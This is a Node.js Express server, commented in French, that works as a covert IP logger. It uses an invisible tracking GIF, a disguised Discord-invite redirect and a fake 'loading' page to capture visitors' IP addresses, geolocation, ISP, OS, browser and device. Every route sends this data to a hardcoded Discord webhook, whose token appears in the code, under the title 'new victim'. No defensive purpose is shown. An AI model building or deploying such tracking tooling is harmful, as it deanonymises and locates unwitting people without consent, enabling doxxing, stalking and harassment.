const express = require('express');
const axios   = require('axios');
const app     = express();

// === CONFIG ===
const WEBHOOK = 'https://discord.com/api/webhooks/1554570079864229888/UgWu8JGaf7SURzrmqjOPGAVOfXzlZs6fgWE64xOeGG0j-uHwlHyQXNDfM0TF1Q8xqlfz';
const DISCORD_INVITE = 'https://discord.gg/xumK5f4gK';
const PORT = 3000;

// GIF 1x1 transparent pour le pixel tracker
const GIF1x1 = Buffer.from(
  '47494638396101000100800000ffffff00000021f90400000000002c00000000' +
  '010001000002024401003b',
  'hex'
);

async function sendWebhook(data) {
  const embed = {
    title: '🎯 Nouvelle victime',
    color: 0xff0000,
    fields: [
      { name: '🌐 IP',         value: `\`${data.ip}\``,        inline: true  },
      { name: '🌍 Pays',       value: `\`${data.country}\``,   inline: true  },
      { name: '🏙️ Ville',      value: `\`${data.city}\``,      inline: true  },
      { name: '📡 ISP',        value: `\`${data.isp}\``,       inline: false },
      { name: '💻 OS',         value: `\`${data.os}\``,        inline: true  },
      { name: '🖥️ Browser',    value: `\`${data.browser}\``,   inline: true  },
      { name: '📱 Device',     value: `\`${data.device}\``,    inline: true  },
      { name: '🔗 Méthode',    value: `\`${data.method}\``,    inline: false },
      { name: '⏰ Heure',      value: `\`${new Date().toISOString()}\``, inline: false }
    ],
    footer: { text: 'IP Logger' }
  };

  await axios.post(WEBHOOK, { embeds: [embed] }).catch(() => {});
}

async function getGeoIP(ip) {
  try {
    const res = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,city,isp`);
    if (res.data.status === 'success') return res.data;
  } catch {}
  return { country: 'Unknown', city: 'Unknown', isp: 'Unknown' };
}

function parseUA(ua = '') {
  // OS
  let os = 'Unknown';
  if (/Windows NT 10/.test(ua))      os = 'Windows 10/11';
  else if (/Windows NT 6/.test(ua))  os = 'Windows 7/8';
  else if (/Mac OS X/.test(ua))      os = 'macOS';
  else if (/Android/.test(ua))       os = 'Android';
  else if (/iPhone|iPad/.test(ua))   os = 'iOS';
  else if (/Linux/.test(ua))         os = 'Linux';

  // Browser
  let browser = 'Unknown';
  if (/Edg\//.test(ua))             browser = 'Edge';
  else if (/OPR\//.test(ua))        browser = 'Opera';
  else if (/Chrome\//.test(ua))     browser = 'Chrome';
  else if (/Firefox\//.test(ua))    browser = 'Firefox';
  else if (/Safari\//.test(ua))     browser = 'Safari';

  // Device
  let device = /Mobi|Android|iPhone|iPad/.test(ua) ? 'Mobile' : 'Desktop';

  return { os, browser, device };
}

// === ROUTE 1 : GIF pixel tracker ===
// Envoie un GIF 1x1 invisible, log l'IP au chargement de l'image
app.get('/img.gif', async (req, res) => {
  const ip  = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
  const ua  = req.headers['user-agent'] || '';
  const geo = await getGeoIP(ip);
  const { os, browser, device } = parseUA(ua);

  await sendWebhook({ ip, ...geo, os, browser, device, method: 'GIF Pixel' });

  res.set('Content-Type', 'image/gif');
  res.set('Cache-Control', 'no-store, no-cache');
  res.send(GIF1x1);
});

// === ROUTE 2 : Lien redirect Discord ===
// Log l'IP puis redirige vers l'invite Discord
app.get('/join', async (req, res) => {
  const ip  = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
  const ua  = req.headers['user-agent'] || '';
  const geo = await getGeoIP(ip);
  const { os, browser, device } = parseUA(ua);

  await sendWebhook({ ip, ...geo, os, browser, device, method: 'Discord Invite Redirect' });

  res.redirect(DISCORD_INVITE);
});

// === ROUTE 3 : Page HTML avec GIF embedé + redirect auto ===
// Combo : charge le gif (log IP) + redirige vers Discord après 1s
app.get('/go', async (req, res) => {
  const ip  = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
  const ua  = req.headers['user-agent'] || '';
  const geo = await getGeoIP(ip);
  const { os, browser, device } = parseUA(ua);

  await sendWebhook({ ip, ...geo, os, browser, device, method: 'Page Combo' });

  res.send(`
    <html>
    <head>
      <meta http-equiv="refresh" content="1;url=${DISCORD_INVITE}">
      <title>Chargement...</title>
    </head>
    <body style="background:#000;display:flex;align-items:center;justify-content:center;height:100vh;">
      <img src="/img.gif" style="display:none">
      <p style="color:#fff;font-family:sans-serif;">Redirection en cours...</p>
    </body>
    </html>
  `);
});

app.listen(PORT, () => console.log(`[+] Logger actif sur port ${PORT}`));
